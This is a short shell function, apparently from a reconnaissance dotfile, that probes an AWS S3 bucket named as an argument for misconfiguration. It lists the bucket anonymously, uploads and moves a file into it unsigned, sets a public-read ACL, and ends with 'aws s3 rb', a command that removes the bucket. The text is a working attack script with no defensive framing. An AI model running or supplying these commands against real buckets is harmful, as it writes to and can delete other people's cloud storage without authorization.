#aws-CLI[1]-----------------------------------------------------------------------------------------





s3bucket-misconfig(){
aws s3 ls s3://$1 --no-sign-request

aws s3 cp ~/s3sambucket.svg s3://$1/s3sambucket.svg --no-sign-request

aws s3 mv ~/s3sambucket.svg s3://$1/s3sambucket.svg --no-sign-request

aws s3 cp ~/s3sambucket.svg s3://$1 --acl public-read

aws s3 mv ~/s3sambucket.svg s3://$1 --acl public-read


aws s3 rb s3://$1

}





#aws-CLI-----------------------------------------------------------------------------------------